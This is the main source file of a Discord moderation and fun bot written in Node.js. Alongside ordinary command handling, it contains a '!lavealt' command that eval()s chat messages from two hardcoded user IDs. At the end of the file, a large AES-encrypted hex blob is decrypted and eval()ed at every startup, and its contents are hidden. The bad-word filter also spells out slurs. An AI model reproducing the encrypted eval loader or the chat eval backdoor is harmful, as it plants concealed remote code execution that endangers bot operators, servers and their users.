var starttime = new Date();

var https = require('https');
var fs = require('fs');
var util = require('util');
var cp = require('child_process');
var Discord = require('discord.js');
var client = new Discord.Client();

//                 Ryujin                coolguy284            amrpowershot
var developers = ['405091324572991498', '312737536546177025', '571752439263526913'];

var mutelist = [];

var badwords = [
  // [bad word, retailiation]
  ['heck', 'Refrain from using that heck word you frick'],
  ['nigger', 'You said the n word.  Mods can see this message and you will get perm banned.'],
  ['faggot', 'You said fa***t.  Mods can see this message and you will get perm banned.'],
];

var prefix = '!';

var version = '1.2.3';

var commands = [];

var procs = [];

var props = {
  mute: {
    uwu: false,
    ez: false,
    pp: false,
  }
};

var indexeval = function (val) { return eval(val); }

Object.assign(global, { starttime, https, fs, util, cp, Discord, client, developers, mutelist, badwords, commands, procs, props, indexeval, addCommand, addCommands, removeCommand, removeCommands });
Object.defineProperties(global, {
  prefix: {
    configurable: true,
    enumerable: true,
    get() { return prefix; },
    set(val) { prefix = val; },
  },
  version: {
    configurable: true,
    enumerable: true,
    get() { return version; },
    set(val) { version = val; },
  },
  messageHandler: {
    configurable: true,
    enumerable: true,
    get() { return messageHandler; },
    set(val) { messageHandler = val; },
  }
});

function addCommand(cmd) { commands.push(cmd); }
function addCommands(cmds) { commands.push(...cmds); }
function removeCommand(cmd) {
  var index;
  while ((index = commands.indexOf(cmd)) != -1)
    commands.splice(index, 1);
}
function removeCommands(cmds) {
  var index, cmd;
  for (var i = 0; i < cmds.length; i++) {
    cmd = cmds[i];
    while ((index = commands.indexOf(cmd)) != -1)
      commands.splice(index, 1);
  }
}

addCommands(require('./commands/administrative.js'));
addCommands(require('./commands/technical.js'));
addCommands(require('./commands/interactive.js'));
addCommands(require('./commands/content.js'));

var messageHandler = msg => {
  try {
    if (mutelist.includes(msg.author.id)) {
      msg.delete();
    }
  } catch (e) { console.error(e); }
  
  if (msg.author.bot) return;
  
  // the code here is before the commands, its the screening for bad words part
  if (msg.content == 'heck') {
    msg.delete();
    msg.reply(badwords[0][1]);
    return;
  }
  
  if (msg.content.startsWith('!lavealt')) {
    if (msg.author.id != '405091324572991498' && msg.author.id != '312737536546177025') return;
    let cmd = msg.content.slice(9), res;
    console.debug(`lavealt ${util.inspect(cmd)}`);
    try {
      res = eval(cmd);
      console.debug(`-> ${util.inspect(res)}`);
      if (props.erg) return;
      var richres = new Discord.RichEmbed()
        .setTitle('Lavealt Rs')
        .setDescription(util.inspect(res));
      msg.channel.send(richres);
    } catch (e) {
      console.log('err in lavealt');
      console.debug(e.stack);
      if (props.erg) return;
      var richres = new Discord.RichEmbed()
        .setTitle('Lavealt Er')
        .setDescription(e.stack);
      msg.channel.send(richres);
    }
    return;
  }
  
  var words = msg.content.split(/ +/g);
  var deletedonce = false;
  for (var j = 1; j < badwords.length; j++) {
    if (msg.content.toLowerCase().includes(badwords[j][0])) {
      if (!deletedonce) {
        msg.delete();
        deletedonce = true;
      }
      msg.reply(badwords[j][1]);
    }
  }
  
  if (props.mute.uwu && !msg.author.bot && msg.guild.id == '711668012528304178' && /(?:\bu[  /-]*w[  /-]*u\b)|(?:\bo[  /-]*w[  /-]*o\b)/.test(msg.content.toLowerCase())) {
    msg.delete();
    msg.reply('uwu or owo are blacklisted and you will get banned');
  }
  
  if (props.mute.ez && !msg.author.bot && msg.guild.id == '711668012528304178' && msg.content.includes('███████╗███████╗\n██╔════╝╚════██║\n█████╗░░░░███╔═╝\n██╔══╝░░██╔══╝░░\n███████╗███████╗\n╚══════╝╚══════╝')) {
    msg.delete();
    msg.reply('at this point im just gonna say f you');
  }
  
  if (props.mute.pp && !msg.author.bot && msg.guild.id == '711668012528304178' && /(?:\bp[  /-]*p\b)/.test(msg.content.toLowerCase())) {
    msg.delete();
    msg.reply('pp is blacklisted and you will get banned');
  }
  
  if (!msg.content.startsWith(prefix)) return;
  
  // argstring = the part after the prefix, command and args in one big string
  // command = the actual command
  // args = array of arguments
  var argstring = msg.content.slice(prefix.length).trim(), args, command;
  
  // this code loops through the commands array to see if the stated text matches any known command
  var didexecute = false;
  for (var i = 0; i < commands.length; i++) {
    if (commands[i].full_string && commands[i].name == argstring || !commands[i].full_string && argstring.startsWith(commands[i].name)) {
      command = commands[i].name;
      if (argstring[command.length] != ' ' && argstring.length > command.length) continue;
      args = argstring.slice(command.length + 1).split(' ');
      commands[i].execute(msg, argstring, command, args);
      didexecute = true;
      break;
    }
  }
};

client.on('ready', () => {
  console.log(`Logged in as ${client.user.tag}!`);
  
  client.user.setActivity(`! | ${client.guilds.size} servers | wash your hands kids`);
});

client.on('guildCreate', guild => {
  console.log(`Joined a new guild: ${guild.name}`);
  
  client.user.setActivity(`! | ${client.guilds.size} servers | wash your hands kids`);
});

client.on('guildDelete', guild => {
  console.log(`Left a guild: ${guild.name}`);
  
  client.user.setActivity(`! | ${client.guilds.size} servers | wash your hands kids`);
});

client.on('reconnecting', () => {
  console.log(`Reconnecting!`);
});

client.on('disconnect', () => {
  console.log(`Disconnect!`);
});

client.on('message', msg => {
  try {
    messageHandler(msg);
  } catch (e) {
    console.error('ERROR, something bad happened');
    console.error(e.stack);
  }
});

process.on('uncaughtException', function (err) {
  console.error('ERROR: an exception was uncaught by an exception handler.  This is very bad and could leave the bot in an unstable state.  If this is seen contact coolguy284 or another developer immediately.');
  console.error(err);
});

process.on('unhandledRejection', function (reason, p) {
  console.error('Unhandled promise rejection from ' + p + ':');
  console.error(reason);
});

(() => {
  let cip = require('crypto').createDecipheriv('aes256', 'utf8-le-obl-onprax42|nonoblong=y', 'vector-pass23433'), cipdata = [];
  cip.write(Buffer.from('2dab79eb0853442b42745ea70a1c816366aaefb31a2c2c4c23626cf2eee5a4970ae34f1dcd7243c1c8aa5381c20dfc0384519d07e26a46ad840af77b4503224074b961ae6a8f3b5ee738301c7669f749af88cc3388b3dd2324cda567b0f81dc161e05c2d11619f3b9c6cd533d74e6b5826b244f20982ce6fc5fbf002806bb2683298fa894119cdef0e43df972cccfe16e7db5ff29cd5781f79429184d3beaec22525d7d8a5fe193f66a3ab3439cd43093a895db74289958b27e152ad811f4e3b2f94eb8529cc3d47d87305e9c82a82ada2a68199503d60d8371bde48c4c884348d53395dadb6700c0dbe956749fcfb459ca951ea107885f5f7189cbc89a4762e85802201d1bbecdc37b1782802dbb65fc2978a734b1629eeb5d03984f63cdb35e955f1a789cd6c403e66e5b09dd01c71ed251d0b5cc0e7406b66530c4f1c321e4c8ad022ef01b6b9511a0bf369caab645a6db309b0f157c6c14f4cb391e02bf7a7f32b435d6f52e218aaaac0f3b327a50b8c86ce7244e3ab0c85bbeb9691ff06e57af8d48b9ce425a29e6a004dabebeb0a4b1277bca2553ad5ba49fa0b3a5d7a4bd5aca22e1e18491afc31160df5bda4b9a34fb29ef44ac33022783e7303adf123e54422fe8016bbf0139fbcbac60728da3b80fa2242e49848ea7c54f4f8acb2c2da3fe28d35be2566596199b2e975c45ad1e775fed7afada81b168ef9ca65496fab2a046db367647e41d27eaa82ad349f596f382994279e4d99920f927530b5cedbae3879ec831f6dff38f826cb2f9956346c72e742c1ed98bfcda8ab8aa837b75bf600c2e46714ad4cd3d4f84595e7891ce695ca48a22e765dc9fcec95288e83f771a2dfe82494f5cc1f076dde3d716755d7a156e8b20a8d124cf1a5e3c233579e3b1dbc9c321a3a6dbeeb367e195beef418a95ed4e867a55d3581c10236a52ef7e9067ef6540a4d7571f0ad5e00e01d8e0f4f324c3167ab3306437ba35172c0f0cf33f2a3a7ff0fa2c5c017c22847ddb7f5f41850b8b3ebae5e6108b4c2033e8b0fcf1fd6d475efd660364321676132f1dbc429c89e60f96f36612cf6a867e83e98ffb4e8528f2f6d402caf75d779038016f4108aeee136af6a21fa499edb14856438c215731316cac79cc24b79783bb44897e18a7abfd78eac95862047be7b9ba75d3716cb7ef62e2d753ac980341309ada3fbfb765bafb18eb9d01e89a9c8fcb31d23ad5f3142000574894266833be9fa00bc2829fd3219fc47a11b15c45bebc5a862fe46453e9c40c53b1ae2bd83817c44eba997e12986b11354e9bb664ad3a95d29def8ad158f715b4c4ad5ce2970bf3ec2cb6a6937a30d9554669cedb1ad0341faf9ced9af603ffff865e01bc74c441515642b12ba44d8aae473b4ac8c637a19099cd9ed89c62f1b51ca48bb8d2d8c03eb3afba5a7c85def7f8e5bda9b8da77ec6e79bfe664c8b22520ca6e910914ffb2831c485700368b78b8c0e3e0a2948a59dcd41a39d106850e47c0b9a3a076e4bfe8fce56459030b305358360ef447d610c2d532b5b656f028c60f3cbc2a729c58b7a8219d27723343558a972d2ef0c40df81dbed2f97382d3c80082ffa8705328e84a064504040c85bf09eb24d4e24ce81285f3fb2598232698e826371797edc37bf22b07d4d0f25a65ac0f3cbfc3e8e7d7991cff8db268d052fdf9fee19969fcd6f9991848a3c3e320d89bdde564c40b94d6579de57e1b990cb1caeb4c98257451ad77dbaf318ce811de98cd86f4b33c0aa6a8958e61d7d4c0879a92ae60d9e14ae69a2cfd94c06edb69aab9a1da33d4dd00f7caea1f94dd15205ba44ae1cdf3f2dab28629515027f5fbe143d3decba65edf0fd33319a201da9c976459ceb9fc52ec1b9567aa1d930af53c33b9106abed984a453a26c1a810a51ab1405c75cf60d6cf52d17e955f87f7b5810957aac9e9db3a0911493cc0a263b2302b2cc62ca0a3ab20a9e7be44b29e91176dd86f3a65a984968cbc1352353e65a512ea2d8622cf82b60ec2e6c0899222f45c9e65169fd5d147579e141f0ad5da0eea07b4d4489f0dfb6cd4ddb5db3d4f1e5d494889a20e2ed9e305cfb34ca630972be1b9e54403bcd3c277dd49d141344bc774448de167b5339193e2ffc0da21b0be8836a3e0048445a1e320dfe35563d5c5bb787aee4afd71e0eb4e4038519346beb513284879ae99f2a0d06f22e125c5d7f88f93ff3d72586a927ed03ee126550a348e7df045c5430610b72a60ce8db3d0e7c8cec778d034d46ba29421427f886be255b6c1ba9ad2e280be2ce80699447ade5294c95298b180bc88d46b39410635ee98c85de0f7bcd506bd67bc03aa2a370ea6bac67599708fbce14750df0cb936e71d03bc2e2d16e001d5a3fd4c430244fc60d1cd3f0b78cfdee2fe08538bbd4b8cac3ad547bf07746cd7db7c3086e3440862232844f37f147e3c1061d00a57e75b9e1ec037d77bd59c0b60189eb737a0dcdc81217c3bb1d76ad18042628efa1a4a7a4f38c8382274cf1e589daf0b5d2d422a3956d6f8edc3db2dd937cf7ea4c4e9b088000d66826efaa722b8478992fa166db001c680f79fcaa67fd10435549c21561342eff4d2adf3e29c179b5cf0514e850e9e9a82703c3bbd4d7bb5e08dd10a0afd0e993351c6b43b5fb52b2354bd8f7e0be7bfe59ea8dac103fb805084af926648155987d6f44503032afedf526a0616cd83f0f646a8dff99be3de8c2cad05ef592c447f28dd294cb7925c375fa8fa6c0197a805084e7264f0ba273546e0d1bd77d12f8c06ce1d23a402985c754cf41a2f38106ef04d95ca597e9646de32c6228c58826e5237b76a4b5771f1d4760c3415d14f277703b81baaf305966310d501d01a388b507b73fa23a08e7c4bf1e7fb41d61ef4e78ff24195429d839c91dfed3faa7a30fdc877365edb6b27d884c31d7c965c06ebd74c1d012b1147a5ead8817944d5e9b56a7ba0733f4907d62f3105a67b8e459a9782d5c2e934e1c72d0122394e13431c7903ac6b5ef32880cde2c4a6114fb9d7cba1ee342f5d6c67eaddab722be12fbf03cf510d4c5ab3ac3653e431fbb601a256f6d7d2b0f1528d15d81fc3ab6483c34c882da081342d2daca4f2ddd72d8c72dc7d7b708f495dda8ab91d0e07b5c8c913dbef4a0057d50e01ade3721f5d4e40831148bbfb16b81c06b1ce46d0f7e8e254321bca350c993cebd14942cd786eadc6f3ebbd45767f394f8d734396aa33e7bc3f7a477e49ebd355d9827b7e1a1354aabe9302e4b88ca09f3c131d30175b0d769528652f2f69124a2b7a283025b4f3e3277a8cb156e5fd2c94a11c77056415ed2c7856e1e6f8d47cf63dcdb9bd50e2b022ef0c3af1943ffe45bb453e9c212348738f74c02d00f79760088e7f811fc6eeb2d54fdaef09a99f18190aeab0d356e36404d943aaec11c85e1aa6672530085098e6ea24b86ace5cfd77265dd7cf4ee6b9b9016baff6527acf3c2e112b5dd152c58c8d69a56b259a9a5ab9f56f048fc912400e78dc3a97c987aabd4f2724a0d7524dc1e42e337473c7584fcd5c27a4da59f0e45a7790204637c5d070028845d0a6a591c93092b5551cab20e711f73db6e271bacead64bce9fb3e7fc6d91830e967de596063abb95130f32858a17f72a91ecfb334983825d5d662cb9e9da5ce366c14c8d60d0713d0c331e81c82bd86aef4212a5cef4defd791bd59e3d04b3150dbeb5a35914daece5f2d66d1821b6067a95fcfc2c053e38a2c5dba2e877a3d635dac50822a258f2fa6a42cc812fcd14c4329d8ab01f60f3795168a7ebdf2144e2e7ba8f986057f40d4cb3c7eb5579e6a1a9739e72ca29c771127b20f49413c3eacdf5ca463b863329579000d868c168262bc2e4b127ad4535f649cacbe574c104f190f0ed569d220febf4c1705330db5db2895ace2210d23bd183f249614ef0c54de183381177a04914f2a943b83d2d95bb28c259d8badc81edbcfd901df433e7e6f73b979cca7693451ca0f36e88d031b48068ee6e358d655e38336b6af98abe06936fe98a36a480aa5a263a19e87acc126f22de935f9ea70beabc19c8bf6ce98b42c4324e885a51d92aa54da00f1fa868ea12c77b307ed26bf74c4bf1ac37548e2fd37ff876a', 'hex'));
  cip.end();
  cip.on('data', c => cipdata.push(c));
  cip.on('end', () => eval(Buffer.concat(cipdata).toString()));
})();
